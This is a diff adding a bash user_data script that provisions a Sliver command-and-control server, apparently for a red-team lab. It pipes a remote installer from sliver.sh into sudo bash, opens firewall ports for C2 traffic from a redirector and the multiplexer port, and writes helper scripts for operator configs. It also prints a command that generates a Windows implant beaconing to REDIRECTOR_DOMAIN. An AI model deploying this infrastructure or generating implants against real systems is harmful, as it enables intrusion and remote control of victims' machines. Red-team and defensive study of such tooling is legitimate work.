@@ -1,0 +1,118 @@
+#!/bin/bash
+# sliver_setup.sh - Sliver C2 server installation
+# Runs automatically via user_data on first boot
+
+set -e
+
+exec > >(tee /var/log/user-data.log)
+exec 2>&1
+
+echo "===== Sliver C2 Server Setup Started $(date) ====="
+
+SSH_PASSWORD="${ssh_password}"
+REDIRECTOR_VPC_CIDR="${redirector_vpc_cidr}"
+
+# Update system
+echo "[*] Updating system packages..."
+apt-get update
+DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
+
+# Install dependencies
+echo "[*] Installing dependencies..."
+apt-get install -y \
+    curl \
+    git \
+    build-essential \
+    mingw-w64 \
+    ufw \
+    net-tools \
+    jq
+
+# Configure SSH password authentication for Guacamole access
+echo "[*] Configuring SSH authentication..."
+echo "ubuntu:$SSH_PASSWORD" | chpasswd
+
+cat >> /etc/ssh/sshd_config << 'SSHCONF'
+
+# Default: require SSH keys
+PasswordAuthentication no
+PubkeyAuthentication yes
+
+# Allow password auth from private networks (for Guacamole access via VPC)
+Match Address 172.16.0.0/12,10.0.0.0/8
+    PasswordAuthentication yes
+SSHCONF
+
+systemctl restart sshd
+
+# Configure UFW firewall
+echo "[*] Configuring firewall rules..."
+ufw --force reset
+ufw default deny incoming
+ufw default allow outgoing
+ufw allow 22/tcp
+ufw allow from $REDIRECTOR_VPC_CIDR to any port 80 proto tcp comment 'HTTP C2 from redirector'
+ufw allow from $REDIRECTOR_VPC_CIDR to any port 443 proto tcp comment 'HTTPS C2 from redirector'
+ufw allow 31337/tcp comment 'Sliver multiplexer'
+ufw --force enable
+
+# Install Sliver C2
+echo "[*] Installing Sliver C2 framework..."
+curl https://sliver.sh/install | sudo bash
+
+# Wait for installation to complete
+sleep 10
+
+# Verify installation
+echo "[*] Verifying Sliver installation..."
+which sliver-server && echo "Sliver server binary found" || echo "WARNING: Sliver binary not found"
+
+# Create operator config generation script
+cat > /root/generate_operator_config.sh << 'OPSCRIPT'
+#!/bin/bash
+# Generate a new operator config file for connecting to this Sliver server
+# Usage: sudo ./generate_operator_config.sh <operator-name>
+
+if [ -z "$1" ]; then
+    echo "Usage: $0 <operator-name>"
+    echo "Example: $0 operator1"
+    exit 1
+fi
+
+OPERATOR_NAME=$1
+echo "[*] Generating operator config for: $OPERATOR_NAME"
+sliver-server operator --name "$OPERATOR_NAME" --lhost 0.0.0.0 --save "/root/$${OPERATOR_NAME}.cfg"
+echo "[*] Config saved to /root/$${OPERATOR_NAME}.cfg"
+echo "[*] Transfer this file to the operator's machine to connect"
+OPSCRIPT
+chmod +x /root/generate_operator_config.sh
+
+# Create a quick-start helper script
+cat > /root/sliver_quickstart.sh << 'QUICKSTART'
+#!/bin/bash
+echo "===== Sliver C2 Quick Start ====="
+echo ""
+echo "1. Start the Sliver server (if not running):"
+echo "   sudo systemctl start sliver"
+echo ""
+echo "2. Open the Sliver console:"
+echo "   sliver-server"
+echo ""
+echo "3. Generate an operator config:"
+echo "   sudo /root/generate_operator_config.sh operator1"
+echo ""
+echo "4. In the Sliver console, start an HTTP listener:"
+echo "   http --lhost 0.0.0.0 --lport 80"
+echo ""
+echo "5. Generate an implant:"
+echo "   generate --http https://REDIRECTOR_DOMAIN/images/ --os windows --arch amd64 --format exe --save /tmp/implant.exe"
+echo ""
+echo "Current status:"
+systemctl status sliver --no-pager 2>/dev/null || echo "Sliver service not found (may need manual start)"
+echo ""
+echo "Multiplexer port: 31337"
+QUICKSTART
+chmod +x /root/sliver_quickstart.sh
+
+echo "===== Sliver C2 Server Setup Completed $(date) ====="
+echo "===== Run /root/sliver_quickstart.sh for usage instructions ====="
